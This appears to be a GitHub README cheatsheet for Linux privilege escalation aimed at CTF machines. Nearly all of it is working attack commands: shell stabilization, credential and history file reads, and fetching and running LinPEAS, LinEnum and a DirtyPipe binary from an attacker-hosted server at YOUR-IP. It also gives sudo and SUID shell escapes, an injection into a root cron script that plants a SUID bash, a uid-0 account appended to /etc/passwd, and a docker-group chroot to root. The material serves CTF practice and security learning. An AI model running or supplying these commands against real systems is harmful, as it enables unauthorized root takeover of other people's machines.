# Linux-Privlilege-Esclanation
Cheatsheet for priv esc linux

Phase 1: Stabilize & Prepare the Shell

# Upgrade to fully interactive TTY (if needed)
script /dev/null -c bash
# or
python3 -c 'import pty; pty.spawn("/bin/bash")'
# Ctrl+Z → stty raw -echo; fg → enter → stty rows 50 columns 200
export TERM=xterm-256color

Phase 2: Basic Manual Enumeration (5–10 minutes, always do this first)

# Who am I?
id
whoami
sudo -l                  # ← MOST IMPORTANT
sudo -l | grep -i nopasswd   # passwordless sudo?

# System info
uname -a
cat /etc/os-release
cat /proc/version
lsb_release -a 2>/dev/null

# Find possible flags (common in CTFs)
find / -name "*root*.txt" -o -name "proof.txt" -o -name "flag*.txt" 2>/dev/null
find / -user root -perm -u=s -type f 2>/dev/null | head -20   # SUID files

# Interesting files you might read as low-priv
cat /etc/crontab /etc/cron.*/* 2>/dev/null
ls -la /var/spool/cron/crontabs/ 2>/dev/null
cat /etc/passwd | grep -v nologin
cat ~/.bash_history ~/.history 2>/dev/null

Phase 3: Transfer & Run Automated Enumerators (the real game changer)

# From your attacker machine, host the script
python3 -m http.server 8000   # or wget from GitHub

# On target (choose one)
# Option 1 – LinPEAS (best, most complete)
wget http://YOUR-IP:8000/linpeas.sh -O /dev/shm/linpeas.sh
chmod +x /dev/shm/linpeas.sh
./linpeas.sh | tee linpeas.txt

# Option 2 – LinEnum
wget http://YOUR-IP:8000/LinEnum.sh -O /dev/shm/e
chmod +x /dev/shm/e && ./e

# Option 3 – linux-exploit-suggester
wget http://YOUR-IP:8000/les.sh && bash les.sh

Phase 4: Exploit the Most Common Vectors (in order of frequency)
1. Sudo Misconfiguration (60% of boxes)

sudo -l
# If you see (ALL) NOPASSWD: ALL → instant root
sudo -i
# or
sudo su

# If you can sudo vim/find/less/man/etc.
sudo vim -c ':!/bin/sh'
sudo find / -exec /bin/sh \; -quit
sudo man man   # then !/bin/sh
# See GTFOBins: https://gtfobins.github.io

2. SUID Binaries (20% of boxes)

find / -perm -u=s -type f 2>/dev/null
# Common exploitable ones: vim, nano, less, find, cp, mv, tar, rsync, python, perl, awk, etc.
# Example with vim
/usr/bin/vim -c ':py import os; os.setuid(0); os.execl("/bin/sh","sh")'

# Example with find
find / -exec /bin/sh -p \; -quit

# Full list: https://gtfobins.github.io/+suid


3. Cron Jobs with Writable Scripts

# Look for root cron that sources a file you can write
cat /etc/crontab
ls -la /etc/cron.*
# If a script in /opt/script.sh is writable → edit it
echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' >> /opt/script.sh
# Wait 1–2 min → /tmp/bash -p

4. Writable /etc/passwd (rare but instant win)

# If /etc/passwd is writable
openssl passwd -1 -salt xyz NewRootPassword
echo 'root2:$1$xyz$abc...::0:0:root:/root:/bin/bash' >> /etc/passwd
su root2


5. Kernel Exploits (Dirty COW, etc.)

# If kernel < 5.8 and LinPEAS flagged it
searchsploit linux kernel $(uname -r | cut -d " " -f2 | cut -d "-" -f1) local
# Common ones: DirtyPipe, DirtyCOW, OverlayFS
# Example DirtyPipe (CVE-2022-0847)
wget http://YOUR-IP:8000/dirtypipe
chmod +x dirtypipe && ./dirtypipe


6. Capabilities
getcap -r / 2>/dev/null
# If something has cap_setuid+ep
/usr/bin/python3 -c 'import os; os.setuid(0); os.system("/bin/sh")'

7. Docker / LXD / systemd Abuse
id | grep docker || id | grep lxd
# If in docker group
docker run -v /:/mnt --rm -it alpine chroot /mnt sh

Phase 5: Verify Root & Grab the Flag

id                              # should show uid=0(root)
cat /root/root.txt
cat /home/*/proof.txt 2>/dev/null
ls -la /root/

Quick Cheat Sheet 

id; sudo -l; uname -a; find / -perm -u=s -type f 2>/dev/null; cat /etc/crontab; wget YOUR-IP:8000/linpeas.sh -O /tmp/lp; chmod +x /tmp/lp; /tmp/lp


<img width="853" height="542" alt="Screenshot From 2025-12-06 05-20-44" src="https://github.com/user-attachments/assets/a5b8d2df-1344-40c0-93ca-ca51f959caf8" />







